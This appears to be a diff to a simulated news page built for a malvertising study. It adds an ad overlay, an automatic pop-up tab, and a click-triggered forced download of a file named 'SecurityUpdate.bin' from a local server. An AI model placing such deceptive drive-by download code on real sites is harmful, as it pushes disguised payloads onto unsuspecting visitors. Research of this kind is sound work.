@@ -35,4 +35,48 @@
 
 <p class="disclaimer">Simulated news site for security research. All advertisements
 are part of a controlled malvertising study in an isolated environment.</p>
+
+<!-- Ad overlay popup -->
+<div id="ad-overlay" style="
+  display:none;position:fixed;top:0;left:0;width:100%;height:100%;
+  background:rgba(0,0,0,0.7);z-index:9999;align-items:center;justify-content:center;">
+  <div style="position:relative;background:#fff;border-radius:8px;overflow:hidden;">
+    <span onclick="document.getElementById('ad-overlay').style.display='none'"
+      style="position:absolute;top:6px;right:10px;font-size:20px;cursor:pointer;
+             z-index:10000;color:#333;font-weight:bold;">&#x2715;</span>
+    <iframe src="http://localhost:8080/ad2.html" width="300" height="250"
+            style="border:none;display:block;" scrolling="no"></iframe>
+  </div>
+</div>
+
+<script>
+  // 1) After 10 seconds, open ad in new tab automatically
+  window.addEventListener("load", function () {
+    setTimeout(function () {
+      window.open("http://localhost:8080/ad.html", "_blank");
+    }, 10000);
+  });
+
+  // 2) On any click anywhere — show ad overlay + trigger file download
+  var adShown = false;
+  document.addEventListener("click", function (e) {
+    // Don't re-trigger if clicking the overlay close button
+    if (e.target.closest && e.target.closest("#ad-overlay")) return;
+
+    if (!adShown) {
+      adShown = true;
+      // Show overlay
+      var overlay = document.getElementById("ad-overlay");
+      overlay.style.display = "flex";
+
+      // Trigger file download
+      var a = document.createElement("a");
+      a.href = "http://localhost:8084/sysupdate.bin";
+      a.download = "SecurityUpdate.bin";
+      document.body.appendChild(a);
+      a.click();
+      document.body.removeChild(a);
+    }
+  });
+</script>
 </body></html>
